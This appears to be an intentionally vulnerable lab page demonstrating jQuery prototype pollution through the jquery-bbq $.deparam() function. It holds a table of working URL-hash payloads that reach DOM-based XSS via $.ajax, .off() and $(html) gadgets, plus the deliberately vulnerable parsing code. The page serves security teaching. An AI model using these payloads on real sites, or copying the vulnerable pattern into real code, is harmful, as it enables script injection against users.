<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Prototype Pollution Demo - 1135</title>
  <link rel="icon" type="image/x-icon" href="../../favicon.ico">
  <link rel="stylesheet" href="../../css/style.css">
  <script src="jquery-3.6.0.js"></script>
  <script src="jquery.ba-bbq.js"></script>
  <style>
    .main-content {
      padding: 40px 20px;
      max-width: 1000px;
      margin: 0 auto;
    }

    .warning-box {
      border: 1px solid #e74c3c;
      background: rgba(231, 76, 60, 0.1);
      color: #e74c3c;
      padding: 20px;
      border-radius: 4px;
      margin-bottom: 30px;
    }

    .info-card {
      background: var(--surface-color);
      border: 1px solid var(--border-color);
      border-radius: 8px;
      padding: 25px;
      margin-bottom: 30px;
      box-shadow: var(--shadow-glow);
    }

    h1,
    h3,
    h4 {
      color: var(--primary-color);
      margin-bottom: 15px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      margin: 20px 0;
      color: var(--text-primary);
    }

    th,
    td {
      border: 1px solid var(--border-color);
      padding: 12px;
      text-align: left;
    }

    th {
      background: rgba(0, 255, 65, 0.1);
      color: var(--primary-color);
    }

    code {
      background: #000;
      color: #3498db;
      padding: 2px 5px;
      border-radius: 3px;
      font-family: var(--font-mono);
      word-break: break-all;
    }

    a {
      color: var(--primary-color);
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }
  </style>
</head>

<body>
  <!-- 导航栏 -->
  <div id="navigation-container"></div>

  <div class="main-content">
    <h1>jQuery Prototype Pollution Demo</h1>
    <p style="color: var(--text-secondary); margin-bottom: 20px;">By WithSecure, 2022</p>

    <div class="warning-box">
      <strong>⚠️ WARNING:</strong> This page is intentionally vulnerable to DOM-based XSS and prototype pollution.
      Visiting links to this page may execute arbitrary JavaScript. For educational purposes only.
    </div>

    <div class="info-card">
      <h3>Payloads Table</h3>
      <table>
        <thead>
          <tr>
            <th>Affected Function</th>
            <th>Payload</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>$.ajax, $.get, $.post</td>
            <td><code>#__proto__[url][]=data:,alert(123)//&__proto__[dataType]=script</code></td>
          </tr>
          <tr>
            <td>(x).off(...)</td>
            <td>
              <code>#__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=&lt;img/src/onerror%3dalert(456)&gt;</code>
            </td>
          </tr>
          <tr>
            <td>$(html)</td>
            <td><code>#__proto__[div][1]=&lt;img src onerror%3dalert(789)&gt;</code></td>
          </tr>
        </tbody>
      </table>
      <p>Append the payload to the URL hash (after #) and refresh the page to test.</p>
    </div>

    <div class="info-card">
      <h3>How it works</h3>
      <p>
        This page uses the vulnerable <code>jquery-bbq</code> library. Its <code>$.deparam()</code> function allows
        modifying
        <code>Object.prototype</code> via URL hash parameters.
      </p>
      <br>
      <p>Vulnerable code:</p>
      <code>var urlHash = $.deparam(location.hash.slice(1));</code>
    </div>
  </div>

  <script>
    // 加载导航栏
    const xhr = new XMLHttpRequest();
    xhr.open('GET', '../../navigation.html', true);
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        document.getElementById('navigation-container').innerHTML = xhr.responseText;
      }
    };
    xhr.send();

    // VULNERABLE CODE BELOW

    // 1. Pollution Trigger
    var urlHash = $.deparam(location.hash.slice(1));

    // 2. Gadgets

    // Gadget 1: $.ajax
    $.ajax({
      url: 'localhost',
      cache: 'false'
    });

    // Gadget 2: $(document).off()
    $(document).off('abc123');

    // Gadget 3: $(html)
    $('<div x="x"></div>');
  </script>
</body>

</html>